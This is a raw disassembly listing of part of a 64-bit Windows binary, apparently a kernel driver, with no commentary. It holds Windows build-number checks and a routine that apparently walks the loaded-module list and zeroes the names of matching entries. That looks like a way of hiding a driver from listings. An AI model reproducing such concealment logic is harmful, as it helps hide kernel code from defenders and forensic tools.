   14000345b:	48 c7 84 24 60 03 00 	movq   $0xffffffffff676980,0x360(%rsp)
   140003462:	00 80 69 67 ff 
   140003467:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000346e:	00 00 
   140003470:	4c 8d 8c 24 58 03 00 	lea    0x358(%rsp),%r9
   140003477:	00 
   140003478:	4c 8d 84 24 68 03 00 	lea    0x368(%rsp),%r8
   14000347f:	00 
   140003480:	48 8d 15 a9 1f 00 00 	lea    0x1fa9(%rip),%rdx        # 0x140005430
   140003487:	48 8d 0d f2 1f 00 00 	lea    0x1ff2(%rip),%rcx        # 0x140005480
   14000348e:	e8 3d fe ff ff       	call   0x1400032d0
   140003493:	85 c0                	test   %eax,%eax
   140003495:	79 14                	jns    0x1400034ab
   140003497:	4c 8d 84 24 60 03 00 	lea    0x360(%rsp),%r8
   14000349e:	00 
   14000349f:	33 d2                	xor    %edx,%edx
   1400034a1:	33 c9                	xor    %ecx,%ecx
   1400034a3:	ff 15 8f 1c 00 00    	call   *0x1c8f(%rip)        # 0x140005138
   1400034a9:	eb c5                	jmp    0x140003470
   1400034ab:	48 8b 8c 24 68 03 00 	mov    0x368(%rsp),%rcx
   1400034b2:	00 
   1400034b3:	83 79 04 04          	cmpl   $0x4,0x4(%rcx)
   1400034b7:	75 06                	jne    0x1400034bf
   1400034b9:	83 79 08 04          	cmpl   $0x4,0x8(%rcx)
   1400034bd:	74 1f                	je     0x1400034de
   1400034bf:	ba 44 52 56 31       	mov    $0x31565244,%edx
   1400034c4:	ff 15 2e 1c 00 00    	call   *0x1c2e(%rip)        # 0x1400050f8
   1400034ca:	4c 8d 84 24 60 03 00 	lea    0x360(%rsp),%r8
   1400034d1:	00 
   1400034d2:	33 d2                	xor    %edx,%edx
   1400034d4:	33 c9                	xor    %ecx,%ecx
   1400034d6:	ff 15 5c 1c 00 00    	call   *0x1c5c(%rip)        # 0x140005138
   1400034dc:	eb 92                	jmp    0x140003470
   1400034de:	8b 79 0c             	mov    0xc(%rcx),%edi
   1400034e1:	ba 44 52 56 31       	mov    $0x31565244,%edx
   1400034e6:	ff 15 0c 1c 00 00    	call   *0x1c0c(%rip)        # 0x1400050f8
   1400034ec:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400034f1:	33 d2                	xor    %edx,%edx
   1400034f3:	41 b8 10 03 00 00    	mov    $0x310,%r8d
   1400034f9:	e8 32 19 00 00       	call   0x140004e30
   1400034fe:	48 8d 4c 24 24       	lea    0x24(%rsp),%rcx
   140003503:	89 7c 24 20          	mov    %edi,0x20(%rsp)
   140003507:	48 8d 35 f2 ca ff ff 	lea    -0x350e(%rip),%rsi        # 0x140000000
   14000350e:	8b 86 b8 54 00 00    	mov    0x54b8(%rsi),%eax
   140003514:	89 01                	mov    %eax,(%rcx)
   140003516:	8b 86 bc 54 00 00    	mov    0x54bc(%rsi),%eax
   14000351c:	89 41 04             	mov    %eax,0x4(%rcx)
   14000351f:	8b 86 c0 54 00 00    	mov    0x54c0(%rsi),%eax
   140003525:	89 41 08             	mov    %eax,0x8(%rcx)
   140003528:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000352d:	e8 fe ef ff ff       	call   0x140002530
   140003532:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140003537:	33 d2                	xor    %edx,%edx
   140003539:	41 b8 10 03 00 00    	mov    $0x310,%r8d
   14000353f:	e8 ec 18 00 00       	call   0x140004e30
   140003544:	33 db                	xor    %ebx,%ebx
   140003546:	89 7c 24 20          	mov    %edi,0x20(%rsp)
   14000354a:	48 8b cb             	mov    %rbx,%rcx
   14000354d:	0f 1f 00             	nopl   (%rax)
   140003550:	0f b7 84 31 c8 54 00 	movzwl 0x54c8(%rcx,%rsi,1),%eax
   140003557:	00 
   140003558:	48 83 c1 02          	add    $0x2,%rcx
   14000355c:	66 89 84 0c 26 01 00 	mov    %ax,0x126(%rsp,%rcx,1)
   140003563:	00 
   140003564:	66 85 c0             	test   %ax,%ax
   140003567:	75 e7                	jne    0x140003550
   140003569:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000356e:	e8 ad f1 ff ff       	call   0x140002720
   140003573:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140003578:	33 d2                	xor    %edx,%edx
   14000357a:	41 b8 10 03 00 00    	mov    $0x310,%r8d
   140003580:	e8 ab 18 00 00       	call   0x140004e30
   140003585:	89 7c 24 20          	mov    %edi,0x20(%rsp)
   140003589:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140003590:	0f b7 84 33 e8 54 00 	movzwl 0x54e8(%rbx,%rsi,1),%eax
   140003597:	00 
   140003598:	48 83 c3 02          	add    $0x2,%rbx
   14000359c:	66 89 84 1c 26 01 00 	mov    %ax,0x126(%rsp,%rbx,1)
   1400035a3:	00 
   1400035a4:	66 85 c0             	test   %ax,%ax
   1400035a7:	75 e7                	jne    0x140003590
   1400035a9:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400035ae:	e8 9d f5 ff ff       	call   0x140002b50
   1400035b3:	33 c9                	xor    %ecx,%ecx
   1400035b5:	ff 15 dd 1a 00 00    	call   *0x1add(%rip)        # 0x140005098
   1400035bb:	48 81 c4 30 03 00 00 	add    $0x330,%rsp
   1400035c2:	5f                   	pop    %rdi
   1400035c3:	5e                   	pop    %rsi
   1400035c4:	5b                   	pop    %rbx
   1400035c5:	c3                   	ret
   1400035c6:	cc                   	int3
   1400035c7:	cc                   	int3
   1400035c8:	cc                   	int3
   1400035c9:	cc                   	int3
   1400035ca:	cc                   	int3
   1400035cb:	cc                   	int3
   1400035cc:	cc                   	int3
   1400035cd:	cc                   	int3
   1400035ce:	cc                   	int3
   1400035cf:	cc                   	int3
   1400035d0:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   1400035d5:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   1400035da:	56                   	push   %rsi
   1400035db:	48 81 ec a0 01 00 00 	sub    $0x1a0,%rsp
   1400035e2:	48 8d 05 17 0c 00 00 	lea    0xc17(%rip),%rax        # 0x140004200
   1400035e9:	48 8b f1             	mov    %rcx,%rsi
   1400035ec:	33 ed                	xor    %ebp,%ebp
   1400035ee:	48 8b da             	mov    %rdx,%rbx
   1400035f1:	48 89 6c 24 30       	mov    %rbp,0x30(%rsp)
   1400035f6:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400035fb:	48 8d 8c 24 b0 01 00 	lea    0x1b0(%rsp),%rcx
   140003602:	00 
   140003603:	45 33 c9             	xor    %r9d,%r9d
   140003606:	45 33 c0             	xor    %r8d,%r8d
   140003609:	33 d2                	xor    %edx,%edx
   14000360b:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   140003610:	ff 15 ba 1a 00 00    	call   *0x1aba(%rip)        # 0x1400050d0
   140003616:	85 c0                	test   %eax,%eax
   140003618:	78 0e                	js     0x140003628
   14000361a:	48 8b 8c 24 b0 01 00 	mov    0x1b0(%rsp),%rcx
   140003621:	00 
   140003622:	ff 15 b0 1a 00 00    	call   *0x1ab0(%rip)        # 0x1400050d8
   140003628:	48 8d 15 01 1f 00 00 	lea    0x1f01(%rip),%rdx        # 0x140005530
   14000362f:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140003634:	ff 15 c6 19 00 00    	call   *0x19c6(%rip)        # 0x140005000
   14000363a:	4c 8d 5e 70          	lea    0x70(%rsi),%r11
   14000363e:	48 8d 0d ab f8 ff ff 	lea    -0x755(%rip),%rcx        # 0x140002ef0
   140003645:	b8 03 00 00 00       	mov    $0x3,%eax
   14000364a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140003650:	49 89 0b             	mov    %rcx,(%r11)
   140003653:	49 89 4b 08          	mov    %rcx,0x8(%r11)
   140003657:	49 89 4b 10          	mov    %rcx,0x10(%r11)
   14000365b:	49 83 c3 40          	add    $0x40,%r11
   14000365f:	48 ff c8             	dec    %rax
   140003662:	49 89 4b d8          	mov    %rcx,-0x28(%r11)
   140003666:	49 89 4b e0          	mov    %rcx,-0x20(%r11)
   14000366a:	49 89 4b e8          	mov    %rcx,-0x18(%r11)
   14000366e:	49 89 4b f0          	mov    %rcx,-0x10(%r11)
   140003672:	49 89 4b f8          	mov    %rcx,-0x8(%r11)
   140003676:	75 d8                	jne    0x140003650
   140003678:	49 89 0b             	mov    %rcx,(%r11)
   14000367b:	49 89 4b 08          	mov    %rcx,0x8(%r11)
   14000367f:	49 89 4b 10          	mov    %rcx,0x10(%r11)
   140003683:	49 89 4b 18          	mov    %rcx,0x18(%r11)
   140003687:	48 8d 05 e2 f7 ff ff 	lea    -0x81e(%rip),%rax        # 0x140002e70
   14000368e:	48 89 8e e0 00 00 00 	mov    %rcx,0xe0(%rsi)
   140003695:	48 89 46 68          	mov    %rax,0x68(%rsi)
   140003699:	48 8d 05 b8 3e 00 00 	lea    0x3eb8(%rip),%rax        # 0x140007558
   1400036a0:	4c 8d 44 24 60       	lea    0x60(%rsp),%r8
   1400036a5:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   1400036aa:	41 b9 22 00 00 00    	mov    $0x22,%r9d
   1400036b0:	33 d2                	xor    %edx,%edx
   1400036b2:	48 8b ce             	mov    %rsi,%rcx
   1400036b5:	40 88 6c 24 28       	mov    %bpl,0x28(%rsp)
   1400036ba:	89 6c 24 20          	mov    %ebp,0x20(%rsp)
   1400036be:	ff 15 7c 1a 00 00    	call   *0x1a7c(%rip)        # 0x140005140
   1400036c4:	85 c0                	test   %eax,%eax
   1400036c6:	0f 88 72 02 00 00    	js     0x14000393e
   1400036cc:	48 8b 05 85 3e 00 00 	mov    0x3e85(%rip),%rax        # 0x140007558
   1400036d3:	48 85 c0             	test   %rax,%rax
   1400036d6:	75 0a                	jne    0x1400036e2
   1400036d8:	b8 e9 00 00 c0       	mov    $0xc00000e9,%eax
   1400036dd:	e9 5c 02 00 00       	jmp    0x14000393e
   1400036e2:	83 48 30 10          	orl    $0x10,0x30(%rax)
   1400036e6:	48 8b 05 6b 3e 00 00 	mov    0x3e6b(%rip),%rax        # 0x140007558
   1400036ed:	b2 10                	mov    $0x10,%dl
   1400036ef:	b1 01                	mov    $0x1,%cl
   1400036f1:	48 89 bc 24 b8 01 00 	mov    %rdi,0x1b8(%rsp)
   1400036f8:	00 
   1400036f9:	c7 80 98 00 00 00 01 	movl   $0x1,0x98(%rax)
   140003700:	00 00 00 
   140003703:	ff 15 3f 1a 00 00    	call   *0x1a3f(%rip)        # 0x140005148
   140003709:	84 c0                	test   %al,%al
   14000370b:	74 14                	je     0x140003721
   14000370d:	48 8d 15 8c 1e 00 00 	lea    0x1e8c(%rip),%rdx        # 0x1400055a0
   140003714:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140003719:	ff 15 e1 18 00 00    	call   *0x18e1(%rip)        # 0x140005000
   14000371f:	eb 12                	jmp    0x140003733
   140003721:	48 8d 15 98 1c 00 00 	lea    0x1c98(%rip),%rdx        # 0x1400053c0
   140003728:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   14000372d:	ff 15 cd 18 00 00    	call   *0x18cd(%rip)        # 0x140005000
   140003733:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   140003738:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   14000373d:	ff 15 0d 1a 00 00    	call   *0x1a0d(%rip)        # 0x140005150
   140003743:	4c 8b 1d 0e 3e 00 00 	mov    0x3e0e(%rip),%r11        # 0x140007558
   14000374a:	48 8b d3             	mov    %rbx,%rdx
   14000374d:	41 81 63 30 7f ff ff 	andl   $0xffffff7f,0x30(%r11)
   140003754:	ff 
   140003755:	48 8b ce             	mov    %rsi,%rcx
   140003758:	e8 b3 e6 ff ff       	call   0x140001e10
   14000375d:	48 8b d3             	mov    %rbx,%rdx
   140003760:	48 8b ce             	mov    %rsi,%rcx
   140003763:	e8 b8 11 00 00       	call   0x140004920
   140003768:	48 8b 5e 28          	mov    0x28(%rsi),%rbx
   14000376c:	48 8d 15 f5 1e 00 00 	lea    0x1ef5(%rip),%rdx        # 0x140005668
   140003773:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140003778:	48 8b fb             	mov    %rbx,%rdi
   14000377b:	ff 15 7f 18 00 00    	call   *0x187f(%rip)        # 0x140005000
   140003781:	48 8d 15 88 1e 00 00 	lea    0x1e88(%rip),%rdx        # 0x140005610
   140003788:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   14000378d:	ff 15 6d 18 00 00    	call   *0x186d(%rip)        # 0x140005000
   140003793:	48 39 6b 50          	cmp    %rbp,0x50(%rbx)
   140003797:	74 1c                	je     0x1400037b5
   140003799:	48 39 6b 60          	cmp    %rbp,0x60(%rbx)
   14000379d:	74 16                	je     0x1400037b5
   14000379f:	48 8d 4b 58          	lea    0x58(%rbx),%rcx
   1400037a3:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   1400037a8:	45 33 c0             	xor    %r8d,%r8d
   1400037ab:	ff 15 57 18 00 00    	call   *0x1857(%rip)        # 0x140005008
   1400037b1:	85 c0                	test   %eax,%eax
   1400037b3:	74 0b                	je     0x1400037c0
   1400037b5:	48 8b 5b 08          	mov    0x8(%rbx),%rbx
   1400037b9:	48 3b df             	cmp    %rdi,%rbx
   1400037bc:	75 d5                	jne    0x140003793
   1400037be:	eb 20                	jmp    0x1400037e0
   1400037c0:	44 0f b7 43 5a       	movzwl 0x5a(%rbx),%r8d
   1400037c5:	48 8b 4b 60          	mov    0x60(%rbx),%rcx
   1400037c9:	33 d2                	xor    %edx,%edx
   1400037cb:	e8 60 16 00 00       	call   0x140004e30
   1400037d0:	44 0f b7 43 4a       	movzwl 0x4a(%rbx),%r8d
   1400037d5:	48 8b 4b 50          	mov    0x50(%rbx),%rcx
   1400037d9:	33 d2                	xor    %edx,%edx
   1400037db:	e8 50 16 00 00       	call   0x140004e30
   1400037e0:	48 8b 5e 28          	mov    0x28(%rsi),%rbx
   1400037e4:	48 8d 15 fd 1e 00 00 	lea    0x1efd(%rip),%rdx        # 0x1400056e8
   1400037eb:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400037f0:	48 8b fb             	mov    %rbx,%rdi
   1400037f3:	ff 15 07 18 00 00    	call   *0x1807(%rip)        # 0x140005000
   1400037f9:	48 8d 15 90 1e 00 00 	lea    0x1e90(%rip),%rdx        # 0x140005690
   140003800:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140003805:	ff 15 f5 17 00 00    	call   *0x17f5(%rip)        # 0x140005000
   14000380b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003810:	48 39 6b 50          	cmp    %rbp,0x50(%rbx)
   140003814:	74 1c                	je     0x140003832
   140003816:	48 39 6b 60          	cmp    %rbp,0x60(%rbx)
   14000381a:	74 16                	je     0x140003832
   14000381c:	48 8d 4b 58          	lea    0x58(%rbx),%rcx
   140003820:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   140003825:	45 33 c0             	xor    %r8d,%r8d
   140003828:	ff 15 da 17 00 00    	call   *0x17da(%rip)        # 0x140005008
   14000382e:	85 c0                	test   %eax,%eax
   140003830:	74 0b                	je     0x14000383d
   140003832:	48 8b 5b 08          	mov    0x8(%rbx),%rbx
   140003836:	48 3b df             	cmp    %rdi,%rbx
   140003839:	75 d5                	jne    0x140003810
   14000383b:	eb 20                	jmp    0x14000385d
   14000383d:	44 0f b7 43 5a       	movzwl 0x5a(%rbx),%r8d
   140003842:	48 8b 4b 60          	mov    0x60(%rbx),%rcx
   140003846:	33 d2                	xor    %edx,%edx
   140003848:	e8 e3 15 00 00       	call   0x140004e30
   14000384d:	44 0f b7 43 4a       	movzwl 0x4a(%rbx),%r8d
   140003852:	48 8b 4b 50          	mov    0x50(%rbx),%rcx
   140003856:	33 d2                	xor    %edx,%edx
   140003858:	e8 d3 15 00 00       	call   0x140004e30
   14000385d:	33 c0                	xor    %eax,%eax
   14000385f:	48 8d 8c 24 84 00 00 	lea    0x84(%rsp),%rcx
   140003866:	00 
   140003867:	33 d2                	xor    %edx,%edx
   140003869:	41 b8 18 01 00 00    	mov    $0x118,%r8d
   14000386f:	66 89 6c 24 40       	mov    %bp,0x40(%rsp)
   140003874:	c7 84 24 80 00 00 00 	movl   $0x11c,0x80(%rsp)
   14000387b:	1c 01 00 00 
   14000387f:	48 89 44 24 42       	mov    %rax,0x42(%rsp)
   140003884:	89 44 24 4a          	mov    %eax,0x4a(%rsp)
   140003888:	66 89 44 24 4e       	mov    %ax,0x4e(%rsp)
   14000388d:	e8 9e 15 00 00       	call   0x140004e30
   140003892:	48 8d 15 77 1f 00 00 	lea    0x1f77(%rip),%rdx        # 0x140005810
   140003899:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000389e:	ff 15 5c 17 00 00    	call   *0x175c(%rip)        # 0x140005000
   1400038a4:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400038a9:	ff 15 f9 18 00 00    	call   *0x18f9(%rip)        # 0x1400051a8
   1400038af:	48 8b bc 24 b8 01 00 	mov    0x1b8(%rsp),%rdi
   1400038b6:	00 
   1400038b7:	48 85 c0             	test   %rax,%rax
   1400038ba:	74 10                	je     0x1400038cc
   1400038bc:	48 8d 8c 24 80 00 00 	lea    0x80(%rsp),%rcx
   1400038c3:	00 
   1400038c4:	ff d0                	call   *%rax
   1400038c6:	85 c0                	test   %eax,%eax
   1400038c8:	78 72                	js     0x14000393c
   1400038ca:	eb 25                	jmp    0x1400038f1
   1400038cc:	4c 8d 84 24 8c 00 00 	lea    0x8c(%rsp),%r8
   1400038d3:	00 
   1400038d4:	48 8d 94 24 88 00 00 	lea    0x88(%rsp),%rdx
   1400038db:	00 
   1400038dc:	48 8d 8c 24 84 00 00 	lea    0x84(%rsp),%rcx
   1400038e3:	00 
   1400038e4:	45 33 c9             	xor    %r9d,%r9d
   1400038e7:	ff 15 c3 18 00 00    	call   *0x18c3(%rip)        # 0x1400051b0
   1400038ed:	84 c0                	test   %al,%al
   1400038ef:	74 4b                	je     0x14000393c
   1400038f1:	81 bc 24 8c 00 00 00 	cmpl   $0x2580,0x8c(%rsp)
   1400038f8:	80 25 00 00 
   1400038fc:	76 3e                	jbe    0x14000393c
   1400038fe:	48 8d 05 4b fb ff ff 	lea    -0x4b5(%rip),%rax        # 0x140003450
   140003905:	48 89 6c 24 30       	mov    %rbp,0x30(%rsp)
   14000390a:	48 8d 8c 24 b0 01 00 	lea    0x1b0(%rsp),%rcx
   140003911:	00 
   140003912:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140003917:	45 33 c9             	xor    %r9d,%r9d
   14000391a:	45 33 c0             	xor    %r8d,%r8d
   14000391d:	33 d2                	xor    %edx,%edx
   14000391f:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   140003924:	ff 15 a6 17 00 00    	call   *0x17a6(%rip)        # 0x1400050d0
   14000392a:	85 c0                	test   %eax,%eax
   14000392c:	78 0e                	js     0x14000393c
   14000392e:	48 8b 8c 24 b0 01 00 	mov    0x1b0(%rsp),%rcx
   140003935:	00 
   140003936:	ff 15 9c 17 00 00    	call   *0x179c(%rip)        # 0x1400050d8
   14000393c:	33 c0                	xor    %eax,%eax
   14000393e:	4c 8d 9c 24 a0 01 00 	lea    0x1a0(%rsp),%r11
   140003945:	00 
   140003946:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   14000394a:	49 8b 6b 28          	mov    0x28(%r11),%rbp
   14000394e:	49 8b e3             	mov    %r11,%rsp
   140003951:	5e                   	pop    %rsi
   140003952:	c3                   	ret
   140003953:	cc                   	int3
   140003954:	cc                   	int3
   140003955:	cc                   	int3
   140003956:	cc                   	int3
   140003957:	cc                   	int3
   140003958:	cc                   	int3
   140003959:	cc                   	int3
   14000395a:	cc                   	int3
   14000395b:	cc                   	int3
   14000395c:	cc                   	int3
   14000395d:	cc                   	int3
   14000395e:	cc                   	int3
   14000395f:	cc                   	int3
   140003960:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   140003965:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000396a:	53                   	push   %rbx
   14000396b:	56                   	push   %rsi
   14000396c:	48 83 ec 28          	sub    $0x28,%rsp
   140003970:	48 d1 ea             	shr    $1,%rdx
   140003973:	bb 00 00 00 00       	mov    $0x0,%ebx
   140003978:	48 8b f1             	mov    %rcx,%rsi
   14000397b:	8b c3                	mov    %ebx,%eax
   14000397d:	74 09                	je     0x140003988
   14000397f:	48 81 fa ff ff ff 7f 	cmp    $0x7fffffff,%rdx
   140003986:	76 05                	jbe    0x14000398d
   140003988:	b8 57 00 07 80       	mov    $0x80070057,%eax
   14000398d:	85 c0                	test   %eax,%eax
   14000398f:	78 48                	js     0x1400039d9
   140003991:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140003996:	48 8d 7a ff          	lea    -0x1(%rdx),%rdi
   14000399a:	4c 8d 4c 24 58       	lea    0x58(%rsp),%r9
   14000399f:	48 8b d7             	mov    %rdi,%rdx
   1400039a2:	e8 73 14 00 00       	call   0x140004e1a
   1400039a7:	85 c0                	test   %eax,%eax
   1400039a9:	78 1e                	js     0x1400039c9
   1400039ab:	48 98                	cltq
   1400039ad:	48 3b c7             	cmp    %rdi,%rax
   1400039b0:	77 17                	ja     0x1400039c9
   1400039b2:	48 3b c7             	cmp    %rdi,%rax
   1400039b5:	75 1b                	jne    0x1400039d2
   1400039b7:	66 89 1c 7e          	mov    %bx,(%rsi,%rdi,2)
   1400039bb:	48 8b 7c 24 20       	mov    0x20(%rsp),%rdi
   1400039c0:	8b c3                	mov    %ebx,%eax
   1400039c2:	48 83 c4 28          	add    $0x28,%rsp
   1400039c6:	5e                   	pop    %rsi
   1400039c7:	5b                   	pop    %rbx
   1400039c8:	c3                   	ret
   1400039c9:	66 89 1c 7e          	mov    %bx,(%rsi,%rdi,2)
   1400039cd:	bb 7a 00 07 80       	mov    $0x8007007a,%ebx
   1400039d2:	48 8b 7c 24 20       	mov    0x20(%rsp),%rdi
   1400039d7:	8b c3                	mov    %ebx,%eax
   1400039d9:	48 83 c4 28          	add    $0x28,%rsp
   1400039dd:	5e                   	pop    %rsi
   1400039de:	5b                   	pop    %rbx
   1400039df:	c3                   	ret
   1400039e0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400039e5:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400039ea:	57                   	push   %rdi
   1400039eb:	48 81 ec 50 01 00 00 	sub    $0x150,%rsp
   1400039f2:	33 c0                	xor    %eax,%eax
   1400039f4:	48 8b d9             	mov    %rcx,%rbx
   1400039f7:	48 8d 4c 24 34       	lea    0x34(%rsp),%rcx
   1400039fc:	33 f6                	xor    %esi,%esi
   1400039fe:	33 d2                	xor    %edx,%edx
   140003a00:	41 b8 18 01 00 00    	mov    $0x118,%r8d
   140003a06:	bf 01 00 00 c0       	mov    $0xc0000001,%edi
   140003a0b:	48 89 44 24 22       	mov    %rax,0x22(%rsp)
   140003a10:	89 44 24 2a          	mov    %eax,0x2a(%rsp)
   140003a14:	66 89 74 24 20       	mov    %si,0x20(%rsp)
   140003a19:	66 89 44 24 2e       	mov    %ax,0x2e(%rsp)
   140003a1e:	c7 44 24 30 1c 01 00 	movl   $0x11c,0x30(%rsp)
   140003a25:	00 
   140003a26:	e8 05 14 00 00       	call   0x140004e30
   140003a2b:	48 8d 15 de 1d 00 00 	lea    0x1dde(%rip),%rdx        # 0x140005810
   140003a32:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140003a37:	ff 15 c3 15 00 00    	call   *0x15c3(%rip)        # 0x140005000
   140003a3d:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140003a42:	ff 15 60 17 00 00    	call   *0x1760(%rip)        # 0x1400051a8
   140003a48:	48 85 c0             	test   %rax,%rax
   140003a4b:	74 1b                	je     0x140003a68
   140003a4d:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140003a52:	ff d0                	call   *%rax
   140003a54:	8b f8                	mov    %eax,%edi
   140003a56:	85 c0                	test   %eax,%eax
   140003a58:	78 3a                	js     0x140003a94
   140003a5a:	8b 54 24 3c          	mov    0x3c(%rsp),%edx
   140003a5e:	8b 4c 24 34          	mov    0x34(%rsp),%ecx
   140003a62:	8b 44 24 38          	mov    0x38(%rsp),%eax
   140003a66:	eb 41                	jmp    0x140003aa9
   140003a68:	4c 8d 44 24 3c       	lea    0x3c(%rsp),%r8
   140003a6d:	48 8d 54 24 38       	lea    0x38(%rsp),%rdx
   140003a72:	48 8d 4c 24 34       	lea    0x34(%rsp),%rcx
   140003a77:	45 33 c9             	xor    %r9d,%r9d
   140003a7a:	ff 15 30 17 00 00    	call   *0x1730(%rip)        # 0x1400051b0
   140003a80:	84 c0                	test   %al,%al
   140003a82:	74 10                	je     0x140003a94
   140003a84:	8b 54 24 3c          	mov    0x3c(%rsp),%edx
   140003a88:	8b 4c 24 34          	mov    0x34(%rsp),%ecx
   140003a8c:	8b 44 24 38          	mov    0x38(%rsp),%eax
   140003a90:	8b fe                	mov    %esi,%edi
   140003a92:	eb 15                	jmp    0x140003aa9
   140003a94:	8b 84 24 68 01 00 00 	mov    0x168(%rsp),%eax
   140003a9b:	8b 8c 24 68 01 00 00 	mov    0x168(%rsp),%ecx
   140003aa2:	8b 94 24 68 01 00 00 	mov    0x168(%rsp),%edx
   140003aa9:	85 ff                	test   %edi,%edi
   140003aab:	78 20                	js     0x140003acd
   140003aad:	89 53 08             	mov    %edx,0x8(%rbx)
   140003ab0:	89 4b 0c             	mov    %ecx,0xc(%rbx)
   140003ab3:	89 43 10             	mov    %eax,0x10(%rbx)
   140003ab6:	81 fa 28 0a 00 00    	cmp    $0xa28,%edx
   140003abc:	75 26                	jne    0x140003ae4
   140003abe:	83 f9 05             	cmp    $0x5,%ecx
   140003ac1:	75 05                	jne    0x140003ac8
   140003ac3:	83 f8 01             	cmp    $0x1,%eax
   140003ac6:	74 05                	je     0x140003acd
   140003ac8:	bf 01 00 00 c0       	mov    $0xc0000001,%edi
   140003acd:	4c 8d 9c 24 50 01 00 	lea    0x150(%rsp),%r11
   140003ad4:	00 
   140003ad5:	8b c7                	mov    %edi,%eax
   140003ad7:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   140003adb:	49 8b 73 20          	mov    0x20(%r11),%rsi
   140003adf:	49 8b e3             	mov    %r11,%rsp
   140003ae2:	5f                   	pop    %rdi
   140003ae3:	c3                   	ret
   140003ae4:	81 fa ce 0e 00 00    	cmp    $0xece,%edx
   140003aea:	75 0d                	jne    0x140003af9
   140003aec:	83 f9 05             	cmp    $0x5,%ecx
   140003aef:	75 d7                	jne    0x140003ac8
   140003af1:	83 f8 02             	cmp    $0x2,%eax
   140003af4:	e9 fa 00 00 00       	jmp    0x140003bf3
   140003af9:	81 fa 70 17 00 00    	cmp    $0x1770,%edx
   140003aff:	74 10                	je     0x140003b11
   140003b01:	81 fa 71 17 00 00    	cmp    $0x1771,%edx
   140003b07:	74 08                	je     0x140003b11
   140003b09:	81 fa 72 17 00 00    	cmp    $0x1772,%edx
   140003b0f:	75 18                	jne    0x140003b29
   140003b11:	83 f9 06             	cmp    $0x6,%ecx
   140003b14:	75 b2                	jne    0x140003ac8
   140003b16:	85 c0                	test   %eax,%eax
   140003b18:	75 ae                	jne    0x140003ac8
   140003b1a:	c7 03 18 00 00 00    	movl   $0x18,(%rbx)
   140003b20:	c7 43 04 20 00 00 00 	movl   $0x20,0x4(%rbx)
   140003b27:	eb a4                	jmp    0x140003acd
   140003b29:	81 fa b0 1d 00 00    	cmp    $0x1db0,%edx
   140003b2f:	75 0d                	jne    0x140003b3e
   140003b31:	83 f9 06             	cmp    $0x6,%ecx
   140003b34:	75 92                	jne    0x140003ac8
   140003b36:	83 f8 01             	cmp    $0x1,%eax
   140003b39:	e9 86 00 00 00       	jmp    0x140003bc4
   140003b3e:	81 fa b1 1d 00 00    	cmp    $0x1db1,%edx
   140003b44:	75 0e                	jne    0x140003b54
   140003b46:	83 f9 06             	cmp    $0x6,%ecx
   140003b49:	0f 85 79 ff ff ff    	jne    0x140003ac8
   140003b4f:	83 f8 01             	cmp    $0x1,%eax
   140003b52:	eb 70                	jmp    0x140003bc4
   140003b54:	81 fa f0 23 00 00    	cmp    $0x23f0,%edx
   140003b5a:	75 0e                	jne    0x140003b6a
   140003b5c:	83 f9 06             	cmp    $0x6,%ecx
   140003b5f:	0f 85 63 ff ff ff    	jne    0x140003ac8
   140003b65:	83 f8 02             	cmp    $0x2,%eax
   140003b68:	eb 5a                	jmp    0x140003bc4
   140003b6a:	81 fa 80 25 00 00    	cmp    $0x2580,%edx
   140003b70:	75 0e                	jne    0x140003b80
   140003b72:	83 f9 06             	cmp    $0x6,%ecx
   140003b75:	0f 85 4d ff ff ff    	jne    0x140003ac8
   140003b7b:	83 f8 03             	cmp    $0x3,%eax
   140003b7e:	eb 44                	jmp    0x140003bc4
   140003b80:	81 fa 84 26 00 00    	cmp    $0x2684,%edx
   140003b86:	75 11                	jne    0x140003b99
   140003b88:	83 f9 06             	cmp    $0x6,%ecx
   140003b8b:	0f 85 37 ff ff ff    	jne    0x140003ac8
   140003b91:	83 f8 04             	cmp    $0x4,%eax
   140003b94:	e9 2d ff ff ff       	jmp    0x140003ac6
   140003b99:	81 fa 5a 27 00 00    	cmp    $0x275a,%edx
   140003b9f:	74 18                	je     0x140003bb9
   140003ba1:	81 fa 00 28 00 00    	cmp    $0x2800,%edx
   140003ba7:	74 10                	je     0x140003bb9
